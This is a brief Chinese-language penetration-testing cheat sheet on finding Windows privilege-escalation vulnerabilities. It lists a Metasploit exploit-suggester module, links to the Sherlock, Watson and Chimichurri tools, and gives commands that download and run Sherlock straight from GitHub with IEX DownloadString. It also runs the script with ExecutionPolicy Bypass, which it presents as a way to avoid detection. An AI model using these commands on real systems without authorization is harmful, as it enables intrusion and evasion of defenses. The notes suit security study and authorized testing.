# windows漏洞扫描与提权

## 漏洞扫描

- 使用msf

```
use post/multi/recon/local_exploit_suggester
```

- 脚本 [Sherlock](https://github.com/mxrmiss/Sherlock)

```
初步使用本地加载脚本

Import-Module Sherlock.ps1

远程加载脚本

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')


在不触发脚本执行检测的情况下运行Sherlock

powershell -ExecutionPolicy Bypass -File Sherlock.ps1
```

- 脚本 [Watson](https://github.com/mxrmiss/Watson)



## 提权

- 脚本 [Chimichurri](https://github.com/mxrmiss/Chimichurri)